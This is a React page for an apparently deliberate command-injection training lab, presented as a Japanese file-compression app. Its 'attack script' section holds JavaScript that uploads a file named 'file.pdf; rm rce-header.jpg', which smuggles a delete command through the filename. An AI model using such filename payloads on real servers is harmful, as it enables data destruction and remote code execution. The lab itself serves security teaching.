'use client';

import { useState, useEffect } from 'react';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { vscDarkPlus } from 'react-syntax-highlighter/dist/esm/styles/prism';

function CodeBlock({ code, language }: { code: string; language: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <div className="relative">
      <button
        onClick={handleCopy}
        className="absolute top-2 right-2 bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm z-10"
      >
        {copied ? '✓ コピー済み' : 'コピー'}
      </button>
      <SyntaxHighlighter language={language} style={vscDarkPlus} customStyle={{ fontSize: '0.875rem', borderRadius: '0.5rem' }}>
        {code}
      </SyntaxHighlighter>
    </div>
  );
}

function CollapsibleSection({ title, children, bgColor, borderColor, textColor }: { title: string; children: React.ReactNode; bgColor: string; borderColor: string; textColor: string }) {
  const [isOpen, setIsOpen] = useState(false);
  return (
    <div className={`mt-8 p-6 ${bgColor} border ${borderColor} rounded-lg`}>
      <button onClick={() => setIsOpen(!isOpen)} className="w-full flex justify-between items-center">
        <h3 className={`text-xl font-semibold ${textColor}`}>{title}</h3>
        <span className={`text-2xl ${textColor}`}>{isOpen ? '▼' : '▶'}</span>
      </button>
      {isOpen && <div className="mt-4">{children}</div>}
    </div>
  );
}

export default function RCE() {
  const [files, setFiles] = useState<string[]>([]);
  const [headerExists, setHeaderExists] = useState(true);

  const fetchFiles = async () => {
    const res = await fetch('/api/rce/files');
    const data = await res.json();
    setFiles(data.files);
  };

  const checkHeader = async () => {
    try {
      const res = await fetch('/rce-header.jpg', { method: 'HEAD' });
      setHeaderExists(res.ok);
    } catch {
      setHeaderExists(false);
    }
  };

  useEffect(() => {
    fetchFiles();
    checkHeader();
    const interval = setInterval(checkHeader, 2000);
    return () => clearInterval(interval);
  }, []);

  const handleUpload = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const form = e.currentTarget;
    const formData = new FormData(form);
    const res = await fetch('/api/rce/upload', {
      method: 'POST',
      body: formData,
    });
    if (!res.ok) {
      alert('アップロードに失敗しました');
      return;
    }
    const data = await res.json();
    if (data.filename) {
      alert('アップロード成功！');
      fetchFiles();
      form.reset();
    } else if (data.error) {
      alert(data.error);
    }
  };

  const handleCompress = async (filename: string) => {
    const res = await fetch('/api/rce/compress', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename }),
    });
    const data = await res.json();
    if (data.message) {
      alert(`${data.message}: ${data.file}`);
      window.location.reload();
    } else {
      alert(data.error);
    }
  };

  const handleRestore = async () => {
    const res = await fetch('/api/rce/restore', { method: 'POST' });
    const data = await res.json();
    if (data.message) {
      alert('ヘッダー画像を復元しました');
      window.location.reload();
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="relative text-white py-20 shadow-lg overflow-hidden bg-transparent">
        <img
          src="/rce-header.jpg"
          alt=""
          className="absolute inset-0 w-full h-full object-cover"
        />
        <div className="absolute inset-0 bg-black/30" />
        <div className="container mx-auto px-4 relative z-10">
          <h1 className="text-3xl font-bold drop-shadow-lg">ファイル圧縮システム</h1>
          <p className="text-base mt-1 drop-shadow-md">アップロードしたファイルを効率的に圧縮します。</p>
          {!headerExists && (
            <button
              onClick={handleRestore}
              className="mt-4 bg-red-500 hover:bg-red-600 text-white px-6 py-2 rounded-lg font-bold"
            >
              🔧 ヘッダー画像を復元
            </button>
          )}
        </div>
      </header>

      <div className="container mx-auto px-4 py-8">
        <div className="flex flex-col lg:flex-row gap-6">
          <aside className="lg:w-80 space-y-4">
            <div className="bg-white rounded-2xl shadow-md p-6 border-4 border-gray-200">
              <h2 className="text-xl font-bold text-gray-700 mb-4">ファイルをアップロード</h2>
              <form onSubmit={handleUpload} className="space-y-4">
                <input
                  type="file"
                  name="file"
                  className="block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-gray-100 file:text-gray-700 hover:file:bg-gray-200"
                  required
                />
                <button
                  type="submit"
                  className="w-full bg-gradient-to-r from-gray-600 to-gray-700 text-white py-3 px-6 rounded-full hover:from-gray-700 hover:to-gray-800 transition font-bold shadow-lg"
                >
                  アップロード
                </button>
              </form>
            </div>

            <div className="bg-gradient-to-br from-gray-100 to-gray-200 rounded-2xl shadow-md p-6 border-4 border-gray-300">
              <h3 className="font-bold text-gray-700 mb-2">📦 このシステムについて</h3>
              <p className="text-sm text-gray-700 leading-relaxed">
                ファイルをアップロードして、tar.gz形式で圧縮ダウンロードできます。
              </p>
            </div>
          </aside>

          <main className="flex-1">
            <div className="bg-white rounded-2xl shadow-md p-6 mb-6 border-4 border-gray-200">
              <h2 className="text-2xl font-bold text-gray-700 mb-4">アップロード済みファイル</h2>
              {files.length > 0 ? (
                <div className="space-y-3">
                  {files.map((file) => (
                    <div key={file} className="flex items-center justify-between bg-gray-50 p-4 rounded-lg border-2 border-gray-200">
                      <span className="font-mono text-sm">{file}</span>
                      <button
                        onClick={() => handleCompress(file)}
                        className="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded-lg font-bold"
                      >
                        圧縮してダウンロード
                      </button>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-gray-500 text-center py-8">ファイルをアップロードしてください</p>
              )}
            </div>

            <CollapsibleSection title="攻撃スクリプト" bgColor="bg-yellow-50" borderColor="border-yellow-300" textColor="text-yellow-800">
              <CodeBlock language="javascript" code={`// 悪意のあるファイル名を作成
const maliciousContent = 'dummy content';
const blob = new Blob([maliciousContent], { type: 'application/pdf' });

// ファイル名にコマンドを埋め込む
const file = new File([blob], 'file.pdf; rm rce-header.jpg', {
  type: 'application/pdf'
});

// ファイル入力に設定
const dt = new DataTransfer();
dt.items.add(file);

const input = document.querySelector('input[type="file"]');
input.files = dt.files;`} />
            </CollapsibleSection>
          </main>
        </div>
      </div>
    </div>
  );
}
